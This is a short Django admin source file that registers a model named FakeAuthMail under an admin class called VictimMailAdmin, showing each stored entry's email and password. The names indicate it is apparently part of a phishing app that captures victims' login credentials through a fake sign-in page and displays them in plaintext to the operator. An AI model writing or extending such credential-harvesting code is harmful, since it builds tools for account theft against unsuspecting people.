from django.contrib import admin

from .models.fakeauth import FakeAuthMail


@admin.register(FakeAuthMail)
class VictimMailAdmin(admin.ModelAdmin):
    list_display = ('email', 'password')
